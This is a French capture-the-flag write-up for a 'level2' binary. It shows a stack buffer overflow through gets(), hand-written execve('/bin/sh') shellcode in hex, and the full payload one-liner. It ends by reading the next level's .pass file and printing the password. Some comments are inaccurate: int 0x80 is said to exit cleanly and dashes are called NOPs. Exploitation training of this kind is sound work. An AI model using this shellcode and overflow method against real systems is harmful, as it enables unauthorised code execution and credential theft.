@@ -1,0 +1,121 @@
+LEVEL 2
+-------
+
+1.	gdb level2
+
+2.	disas main
+	On voit que la fonction main appelle une fonction annexe, la fonction p
+	0x08048545 <+6>:	call   0x80484d4 <p>
+
+3.	disas p
+	Dans la fonction p on voit que gets est utilisée. Comme le level précédent
+	on va utiliser le buffer overflow.
+	Différences avec le level1:
+		-Check de la valeur de retour du buffer, on ne peut pas appeler une 
+		fonction hors de la stack.
+			0x080484fb <+39>:	and    $0xb0000000,%eax
+			0x08048500 <+44>:	cmp    $0xb0000000,%eax
+		-Il va falloir écrire un shellcode qui "crée" un appel à execve.
+
+4.	Tout d'abord on cherche où se trouve l'EIP (pointeur vers la prochaine instruction)
+	Ce site nous permet de trouver rapidement l'offset:
+	https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+	L'offset est de 80 avant d'atteindre l'eip.
+	En sachant qu'on ne peut pas juste appeler une fonction avec l'EIP à
+	cause du check ligne +39 et +44 de la fonction p.
+
+5.	Buffer overflow représentation:
+
+	[------SHELLCODE + NOP instructions------][---EIP---][0]
+	----------------80-----------------------------4------1-
+
+	Voilà ce qu'il va falloir faire.
+
+6.	Alors tout d'abord le shellcode il faut créer un programme assembleur
+	qui va lancer un execve("/bin/sh", NULL, NULL):
+
+	global _start
+	section .text
+	_start:
+		xor ebx, ebx		//	xor mise à 0 des registres principaux
+		xor edx, edx		//	ebx, edx, ecx
+		xor ecx, ecx		//	ebx et edx vont être les arguments 3 et 2 de la fonction execve
+		push ecx			//	ecx va etre push et derrière on va mettre /bin/sh à l'envers
+		push 0x68732f6e		//	= 'hs/n'
+		push 0x69622f2f		//	= 'ib//'
+		mov ebx, esp		//	Stack dans ebx
+		xor eax, eax		//	Mise à 0 du dernier registre
+		mov al, 0xb			//	Call système 11 (0xb) qui correspond à execve
+		and esp, 0xfffffff0	//	Alignement mémoire sinon segfault
+		int 0x80			//	On quitte le programme proprement
+
+	Compilation:
+		nasm -f elf32 shellcode.s
+		ld -m elf_i386 -o ./shellcode shellcode.o
+
+	On transforme maintenant ce programme en shellcode:
+		objdump -d shellcode
+
+	08048060 <_start>:
+	8048060:	31 db                	xor    %ebx,%ebx
+	8048062:	31 d2                	xor    %edx,%edx
+	8048064:	31 c9                	xor    %ecx,%ecx
+	8048066:	51                   	push   %ecx
+	8048067:	68 6e 2f 73 68       	push   $0x68732f6e
+	804806c:	68 2f 2f 62 69       	push   $0x69622f2f
+	8048071:	89 e3                	mov    %esp,%ebx
+	8048073:	31 c0                	xor    %eax,%eax
+	8048075:	b0 0b                	mov    $0xb,%al
+	8048077:	83 e4 f0             	and    $0xfffffff0,%esp
+	804807a:	cd 80                	int    $0x80
+
+	Sur la ligne centrale se trouvent l'équivalent en hexa des actions effectuées.
+	Pour le convertir en shellcode, nous allons prendre chaque nombre hexa et y ajouter \x
+	devant.
+	Shellcode = "\x31\xdb\x31\xd2\x31\xc9\x51\x68"
+				"\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
+				"\x69\x89\xe3\x31\xc0\xb0\x0b\x83"
+				"\xe4\xf0\xcd\x80"
+
+7.	Une fois le shellcode fait, nous allons compter le nombre d'octets.
+	Pour cela on compte chaque nombre hexa.
+	Le shellcode fait 28 octets.
+
+8.	On sait qu'il faut remplir 80octets, on en a déjà 28 grâce au shellcode.
+	Donc on va ajouter derrière 52 NOP (instruction nulle).
+
+9.	Maintenant il ne nous reste plus qu'à remplir avec une adresse disponible
+	le registre EIP pour passer outre le check.
+	Pour cela on va analyser les adresses disponibles, on peut utiliser la valeur de retour
+	de strdup qui est 0x804a008. Mais on peut utiliser toutes les adresses où eax
+	est utilisé. La commande suivante nous permet de voir où est appelé eax:
+
+		objdump -d level2 | grep 'call' | grep 'eax'
+
+		80484cf:	ff d0                	call   *%eax
+		80485eb:	ff d0                	call   *%eax
+
+	Donc on peut utiliser les 3 adresses suivantes pour compléter notre payload.
+		-	0x0804a008
+		-	0x080484cf
+		-	0x080485eb
+
+10.	Cela nous donne:
+	Shellcode				=	"\x31\xdb\x31\xd2\x31\xc9\x51\x68"
+								"\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
+								"\x69\x89\xe3\x31\xc0\xb0\x0b\x83"
+								"\xe4\xf0\xcd\x80"
+	
+	NOP instructions x52	=	"----------------------------------------------------------"
+	Adresse de retour		=	0x080485eb ---> "\xeb\x85\x04\x08"
+
+11.	On lance la commande:
+
+	python -c 'print "\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80" + 52 * "-" + "\xeb\x85\x04\x08"' > /tmp/lvl2
+	cat /tmp/lvl2 - | ./level2
+
+12.	Une fois dans le shell il ne nous reste plus qu'à lancer:
+	cat /home/user/level3/.pass
+
+12.	su level3
+	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
